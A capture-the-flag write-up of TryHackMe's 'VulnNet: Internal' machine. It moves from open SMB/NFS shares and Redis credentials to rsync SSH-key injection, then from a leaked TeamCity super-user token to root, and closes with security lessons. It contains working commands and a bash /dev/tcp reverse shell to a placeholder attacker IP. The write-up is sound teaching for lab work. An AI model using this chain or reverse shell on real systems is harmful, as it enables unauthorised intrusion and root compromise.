# VulnNet: Internal - TryHackMe Writeup

**Target:** `TARGET_IP` (10.128.153.142 at time of solve)
**OS:** Linux
**Difficulty:** Easy (plays like Medium — multi-protocol pivot)

---

## Attack Chain Overview

```
Port Discovery (22, 111, 139, 445, 873 rsync, 2049 NFS, 6379 Redis, ephemeral)
    ↓
Anonymous SMB → \shares readable → services flag
    ↓
NFS: showmount -e → /opt/conf world-exported → mount
    ↓
grep secrets in NFS mount → Redis requirepass "B65Hx562F@ggAZ@F"
    ↓
redis-cli AUTH → KEYS * → GET "internal flag" + LRANGE authlist → base64 → rsync creds
    ↓
rsync read rsync://rsync-connect@target/files → sys-internal user dir (user flag)
    ↓
ssh-keygen → rsync WRITE of authorized_keys into sys-internal/.ssh
    ↓
SSH as sys-internal → local TeamCity on 127.0.0.1:8111 as root
    ↓
ssh -L 8111:localhost:8111 → access TeamCity UI
    ↓
Find super-user token in /TeamCity/logs/catalina.out
    ↓
TeamCity UI as super user → build step Command Line → reverse shell as root
    ↓
Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [SMB Anonymous Share](#smb-anonymous-share)
3. [NFS Share Enumeration](#nfs-share-enumeration)
4. [Redis Authentication & Enumeration](#redis-authentication--enumeration)
5. [rsync Read → sys-internal Home](#rsync-read--sys-internal-home)
6. [rsync Write → SSH Key Injection](#rsync-write--ssh-key-injection)
7. [User Foothold as sys-internal](#user-foothold-as-sys-internal)
8. [Local Service Discovery — TeamCity](#local-service-discovery--teamcity)
9. [SSH Port Forwarding to TeamCity UI](#ssh-port-forwarding-to-teamcity-ui)
10. [TeamCity Super User Token → RCE](#teamcity-super-user-token--rce)
11. [Root Flag](#root-flag)
12. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Port Discovery
```bash
export TARGET=10.128.153.142
nmap -sS -p- --min-rate 5000 -n $TARGET
```

```bash
nmap -sVC -p22,111,139,445,873,2049,6379,45713,46991,49585,53297 $TARGET -oA service-scan
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH |
| 111 / 2049 | rpcbind + NFS | Check `showmount` |
| 139 / 445 | SMB | Check anonymous shares |
| 873 | rsync | Daemon-mode, look for modules |
| 6379 | Redis | Requires auth probably |
| 45713+ | NFS dynamic / misc RPC | Accompany 2049 |

---

## SMB Anonymous Share

```bash
enum4linux -a $TARGET
```

The relevant line is the `shares` enumeration — `\shares` is listed READ. No credentials needed.

```bash
smbclient -N -L //$TARGET/
smbclient -N //$TARGET/shares
smbclient -N //$TARGET/shares -c 'recurse ON; prompt OFF; mget *'
```

Inside is a **services flag** — the first of several in the box.

---

## NFS Share Enumeration

```bash
showmount -e $TARGET
```

Output:
```
/opt/conf   *
```

The `*` wildcard means **any host can mount it** — no export restrictions.

### Mount locally
```bash
sudo mkdir -p /mnt/nfs_conf
sudo mount -t nfs $TARGET:/opt/conf /mnt/nfs_conf
ls -la /mnt/nfs_conf
```

### Credential hunt on the mount
```bash
grep -rEi "pass|key|secret|token" /mnt/nfs_conf/ 2>/dev/null
```

Hit on `redis.conf`:
```
requirepass "B65Hx562F@ggAZ@F"
```

---

## Redis Authentication & Enumeration

### Authenticate
```bash
redis-cli -h $TARGET -a 'B65Hx562F@ggAZ@F'
```

### Enumerate
```
127.0.0.1:6379> INFO
127.0.0.1:6379> KEYS *
```

Interesting keys include an `internal flag` value and a list named `authlist`.

### Grab the internal flag
```
127.0.0.1:6379> GET "internal flag"
```

### Walk the authlist
```
127.0.0.1:6379> LRANGE "authlist" 0 -1
```

One entry is a base64 blob. Decode it on the attacker:
```bash
echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
```

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

(Note: the original log message truncates the final `v` in some copies — include it.)

---

## rsync Read → sys-internal Home

rsync is running in daemon mode on port 873 with modules defined in `rsyncd.conf`. The credential above authenticates to the `files` module.

### Prepare a password file
```bash
echo "Hcg3HP67@TW@Bc72v" > /tmp/rsync.pass
chmod 600 /tmp/rsync.pass
```

### List modules (optional, confirms `files`)
```bash
rsync --list-only rsync://$TARGET/
```

### Mirror the module locally
```bash
rsync -av --password-file=/tmp/rsync.pass \
  rsync-connect@$TARGET::files ./rsync_files/
```

### Locate the user flag
```bash
find ./rsync_files -type f -iname "*.txt"
cat ./rsync_files/sys-internal/user.txt        # path varies
```

The `sys-internal/` subtree mirrors the user's home. `.ssh/` is writable through the same module — we will abuse that next.

---

## rsync Write → SSH Key Injection

### Generate an SSH keypair locally
```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_vulnnet -N ""
```

### Stage the pubkey as an `authorized_keys` file
```bash
cp ~/.ssh/id_rsa_vulnnet.pub ./authorized_keys
```

### Push it into the target's `sys-internal/.ssh/`
```bash
rsync --password-file=/tmp/rsync.pass authorized_keys \
  rsync://rsync-connect@$TARGET/files/sys-internal/.ssh/
```

The module is writable — rsync accepts the upload without a credential for write (the module auth above is sufficient).

---

## User Foothold as sys-internal

```bash
ssh -i ~/.ssh/id_rsa_vulnnet sys-internal@$TARGET
```

```
sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal)
sys-internal@vulnnet-internal:~$ cat user.txt
```

---

## Local Service Discovery — TeamCity

Baseline enumeration:
```bash
id
groups
sudo -l
ps auxf | grep -Ei "teamcity|java|root"
ss -tulpn
```

Two local-only listeners stand out:
```
LISTEN 127.0.0.1:8111   (TeamCity Server, running as root)
LISTEN 127.0.0.1:9090   (TeamCity Build Agent)
```

Review the build agent config:
```bash
cat ./buildAgent/conf/buildAgent.properties
```

It includes an `authorizationToken` (agent-level, not useful for the UI):
```
authorizationToken=b441ad5edaf61a90da0969cb9a2b4079
```

The UI needs a **super user token** — printed in TeamCity's main log on every server start.

---

## SSH Port Forwarding to TeamCity UI

From the attacker, exit the interactive shell (or open a second terminal) and forward both ports:

```bash
ssh -i ~/.ssh/id_rsa_vulnnet \
    -L 8111:localhost:8111 \
    -L 9090:localhost:9090 \
    sys-internal@$TARGET
```

Now `http://localhost:8111/` renders the TeamCity login.

---

## TeamCity Super User Token → RCE

### Locate the super-user token in logs
```bash
sudo -n true 2>/dev/null || true
find /TeamCity/logs -type f -exec grep -l "Super user" {} \; 2>/dev/null
cat /TeamCity/logs/catalina.out | grep -A1 -i "super user"
```

Sample line:
```
Super user authentication token: 2181062568204067727
```

### Authenticate to the UI
Open `http://localhost:8111/login.html?super=1` (or use the login field: empty username, token as password).

### Build a Command Line step that runs as root

TeamCity builds run as the process owner of the agent — the agent is started by the server, which runs as root on this host.

1. _Projects_ → _Create project_ → name `Prueba`, ID `Prueba`.
2. Inside, _Create build configuration_ → name `ReverseShell`.
3. _Build Steps_ → _Add build step_ →
   - Runner type: **Command Line**
   - Step name: `Reverse Shell`
   - Execute: **Custom script**
   - Script:
     ```bash
     bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
     ```
4. _Agents_ → confirm `Default Agent` is _Authorized_.

### Catch the shell
Listener on the attacker:
```bash
nc -lvnp 4444
```

### Fire the build
Back in TeamCity UI → _ReverseShell_ → **Run**.

The agent executes the script **as root** → callback lands on `nc`:
```
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | SMB + NFS + rsync + Redis on one host | Every service enumerated separately yielded something |
| **Initial leak** | Anonymous SMB share | Services flag + orientation |
| **Config disclosure** | Unrestricted NFS export (`*`) | `/opt/conf` contained Redis master password |
| **Datastore abuse** | Authenticated Redis `LRANGE` | `authlist` list stored base64 of rsync creds |
| **Lateral movement** | rsync module abuse (read + write) | Pushed `authorized_keys` into `sys-internal/.ssh/` |
| **Service discovery** | `ss -tulpn` loopback listeners | TeamCity 8111 / 9090 running as root |
| **Pivoting** | SSH `-L` port forwarding | Exposed loopback UI to attacker |
| **RCE** | TeamCity super-user token in log | Build step with Command Line runner → root |

### Security Lessons

1. **Do not export NFS with `*` wildcard** — always use `rw,host-list` with explicit IPs or subnets.
2. **Redis is not a secure keystore for secrets** — `LRANGE` and `KEYS *` show everything to anyone with AUTH access.
3. **rsync modules default to readable/writeable** — set `read only = yes` in `rsyncd.conf` unless intentionally shared for write, and always require secrets for both directions.
4. **TeamCity super user tokens print to the main log** — log files must be readable only by service accounts.
5. **Build agents inherit the server's privileges** — running TeamCity as root means every build step is root RCE.

### Related Notes
- [ftp](../../tools/ftp.md) / [smbclient](../../tools/smbclient.md) / [enum4linux](../../tools/enum4linux.md) — initial SMB triage
- [showmount + NFS abuse playbook](../../exploits/nfs-share-abuse.md)
- [Redis authenticated enumeration](../../exploits/redis-auth-abuse.md)
- [rsync module read/write abuse](../../exploits/rsync-module-abuse.md)
- [TeamCity super-user token RCE](../../exploits/teamcity-superuser-token-rce.md)
- [SSH port forwarding](../../exploits/ssh-tunneling.md)
- [Linux enumeration playbook](../../exploits/linux-enumeration.md)
